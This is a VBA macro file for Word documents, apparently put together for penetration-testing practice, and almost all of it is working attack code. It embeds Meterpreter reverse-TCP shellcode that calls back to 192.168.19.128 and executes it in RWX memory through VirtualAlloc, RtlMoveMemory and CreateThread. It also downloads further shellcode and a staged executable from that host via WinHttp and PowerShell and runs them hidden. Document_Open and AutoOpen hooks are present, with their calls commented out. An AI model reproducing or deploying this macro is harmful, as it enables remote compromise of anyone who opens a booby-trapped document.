'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.19.128 EXITFUNC=thread -f vbapplication

Private Declare PtrSafe Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, ByRef nSize As Long) As Boolean
Private Declare PtrSafe Function GetPhysicallyInstalledSystemMemory Lib "Kernel32.dll" (ByRef TotalMemoryInKilobytes As LongLong) As Boolean

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
'LPVOID VirtualAlloc(
'  [in, optional] LPVOID lpAddress,
'  [in]           SIZE_T dwSize,
'  [in]           DWORD  flAllocationType,
'  [in]           DWORD  flProtect
');

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
'VOID RtlMoveMemory(
'  _Out_       VOID UNALIGNED *Destination,
'  _In_  const VOID UNALIGNED *Source,
'  _In_        SIZE_T         Length
');

Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
'HANDLE CreateThread(
'  [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
'  [in]            SIZE_T                  dwStackSize,
'  [in]            LPTHREAD_START_ROUTINE  lpStartAddress,
'  [in, optional]  __drv_aliasesMem LPVOID lpParameter,
'  [in]            DWORD                   dwCreationFlags,
'  [out, optional] LPDWORD                 lpThreadId
');

Sub DownloadSCodeAndE()
    Dim szURL   As String
    Dim result  As String
    Dim http    As Object
    Dim buf     As Variant

    szURL = "http://192.168.19.128:8000/buf.txt"

    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
    http.Open "GET", szURL, False
    http.Send

    result = http.responseText
    Set http = Nothing

    buf = ParseByteArray(result)

    Dim i As Long
    Dim check As String
    For i = 0 To UBound(buf)
        check = check & buf(i) & " "
    Next i
    
    Dim addr As LongPtr
    
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    
    Dim counter As Long
    Dim data As Long
    Dim res As LongPtr
    
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, 0)
        

End Sub

Function ParseByteArray(ByVal rawText As String) As Variant

    Dim cleaned As String
    cleaned = rawText

    ' Step 1: Remove "buf = Array(" or "Array(" prefix
    Dim startPos As Long
    startPos = InStr(cleaned, "Array(")
    If startPos > 0 Then
        cleaned = Mid(cleaned, startPos + 6)
    End If

    ' Step 2: Remove closing ")"
    Dim endPos As Long
    endPos = InStr(cleaned, ")")
    If endPos > 0 Then
        cleaned = Left(cleaned, endPos - 1)
    End If

    ' Step 3: Remove line continuation " _"
    cleaned = Join(Split(cleaned, " _"), "")

    ' Step 4: Remove all newlines
    cleaned = Join(Split(cleaned, vbCrLf), "")
    cleaned = Join(Split(cleaned, vbCr), "")
    cleaned = Join(Split(cleaned, vbLf), "")

    ' Step 5: Remove all spaces
    cleaned = Join(Split(cleaned, " "), "")

    ' Step 6: Remove trailing comma if any
    If Right(cleaned, 1) = "," Then
        cleaned = Left(cleaned, Len(cleaned) - 1)
    End If

    ' Step 7: Split by comma
    Dim parts() As String
    parts = Split(cleaned, ",")

    ' Step 8: Build Variant array of bytes
    Dim buf As Variant
    ReDim buf(UBound(parts))

    Dim i As Long
    For i = 0 To UBound(parts)
        Dim val As String
        val = Trim(parts(i))
        If val <> "" Then
            buf(i) = CByte(val)
        End If
    Next i

    ParseByteArray = buf

End Function


Function VBAShellCode()
    Dim buf As Variant
    Dim addr As LongPtr
    
    buf = Array(252, 72, 131, 228, 240, 232, 204, 0, 0, 0, 65, 81, 65, 80, 82, 81, 72, 49, 210, 86, 101, 72, 139, 82, 96, 72, 139, 82, 24, 72, 139, 82, 32, 72, 139, 114, 80, 77, 49, 201, 72, 15, 183, 74, 74, 72, 49, 192, 172, 60, 97, 124, 2, 44, 32, 65, 193, 201, 13, 65, 1, 193, 226, 237, 82, 65, 81, 72, 139, 82, 32, 139, 66, 60, 72, 1, 208, 102, 129, 120, 24, _
11, 2, 15, 133, 114, 0, 0, 0, 139, 128, 136, 0, 0, 0, 72, 133, 192, 116, 103, 72, 1, 208, 139, 72, 24, 80, 68, 139, 64, 32, 73, 1, 208, 227, 86, 72, 255, 201, 77, 49, 201, 65, 139, 52, 136, 72, 1, 214, 72, 49, 192, 65, 193, 201, 13, 172, 65, 1, 193, 56, 224, 117, 241, 76, 3, 76, 36, 8, 69, 57, 209, 117, 216, 88, 68, 139, 64, 36, 73, 1, _
208, 102, 65, 139, 12, 72, 68, 139, 64, 28, 73, 1, 208, 65, 139, 4, 136, 72, 1, 208, 65, 88, 65, 88, 94, 89, 90, 65, 88, 65, 89, 65, 90, 72, 131, 236, 32, 65, 82, 255, 224, 88, 65, 89, 90, 72, 139, 18, 233, 75, 255, 255, 255, 93, 73, 190, 119, 115, 50, 95, 51, 50, 0, 0, 65, 86, 73, 137, 230, 72, 129, 236, 160, 1, 0, 0, 73, 137, 229, 73, _
188, 2, 0, 17, 92, 192, 168, 19, 128, 65, 84, 73, 137, 228, 76, 137, 241, 65, 186, 76, 119, 38, 7, 255, 213, 76, 137, 234, 104, 1, 1, 0, 0, 89, 65, 186, 41, 128, 107, 0, 255, 213, 106, 10, 65, 94, 80, 80, 77, 49, 201, 77, 49, 192, 72, 255, 192, 72, 137, 194, 72, 255, 192, 72, 137, 193, 65, 186, 234, 15, 223, 224, 255, 213, 72, 137, 199, 106, 16, 65, _
88, 76, 137, 226, 72, 137, 249, 65, 186, 153, 165, 116, 97, 255, 213, 133, 192, 116, 10, 73, 255, 206, 117, 229, 232, 147, 0, 0, 0, 72, 131, 236, 16, 72, 137, 226, 77, 49, 201, 106, 4, 65, 88, 72, 137, 249, 65, 186, 2, 217, 200, 95, 255, 213, 131, 248, 0, 126, 85, 72, 131, 196, 32, 94, 137, 246, 106, 64, 65, 89, 104, 0, 16, 0, 0, 65, 88, 72, 137, 242, _
72, 49, 201, 65, 186, 88, 164, 83, 229, 255, 213, 72, 137, 195, 73, 137, 199, 77, 49, 201, 73, 137, 240, 72, 137, 218, 72, 137, 249, 65, 186, 2, 217, 200, 95, 255, 213, 131, 248, 0, 125, 40, 88, 65, 87, 89, 104, 0, 64, 0, 0, 65, 88, 106, 0, 90, 65, 186, 11, 47, 15, 48, 255, 213, 87, 89, 65, 186, 117, 110, 77, 97, 255, 213, 73, 255, 206, 233, 60, 255, _
255, 255, 72, 1, 195, 72, 41, 198, 72, 133, 246, 117, 180, 65, 255, 231, 88, 106, 0, 89, 187, 224, 29, 42, 10, 65, 137, 218, 255, 213)
    
    'UBound(buf) -> Calculate the size of buf automatically. So no need to set it manually when the payload is changed
    '&H3000 -> MEM_COMMIT and MEM_RESERVE. https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
    '&H40 -> RWX
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    
    Dim counter As Long
    Dim data As Long
    Dim res As LongPtr
    
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, 0)
    
End Function

Sub MyMacro()
    MsgBox "Printing Something"
    
End Sub

Sub CmdMacro()
    Dim str As String
    str = "cmd.exe"
    Shell str, vbHide
    
End Sub

Sub WscriptCmdMacro()
    Dim str As String
    str = "cmd.exe"
    CreateObject("Wscript.Shell").Run str, 0
    
End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
    
End Sub

Sub DownloadPayload()
    Dim cmd As String
    cmd = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.19.128:8000/msfstaged.exe', 'msfstaged.exe')"
    
    Shell cmd, vbHide
    Dim exePath As String
    exePath = ActiveDocument.Path & "\" & "msfstaged.exe"
    Wait (2)
    Shell exePath, vbHide
    
End Sub

Function PrintUname()
    Dim res As Boolean
    Dim MyBuff As String * 256
    Dim MySize As Long
    Dim strlen As Long
    MySize = 256
    
    res = GetUserName(MyBuff, MySize)
    strlen = InStr(1, MyBuff, vbNullChar) - 1
    MsgBox Left$(MyBuff, strlen)
    
End Function


Function PrintRam()
    Dim res As Boolean
    Dim TotalMemoryInKilobytes As LongLong
    Dim strlen As Long
    
    res = GetPhysicallyInstalledSystemMemory(TotalMemoryInKilobytes)
    MsgBox TotalMemoryInKilobytes
    
End Function


Sub Document_Open()
    'MyMacro
    'WscriptCmdMacro
    'CmdMacro
    'DownloadPayload
    'PrintUname
    'PrintRam
    'VBAShellCode
    'DownloadSCodeAndE
    
End Sub

Sub AutoOpen()
    'MyMacro
    'WscriptCmdMacro
    'CmdMacro
    'DownloadPayload
    'PrintUname
    'PrintRam
    'VBAShellCode
    'DownloadSCodeAndE
    
End Sub
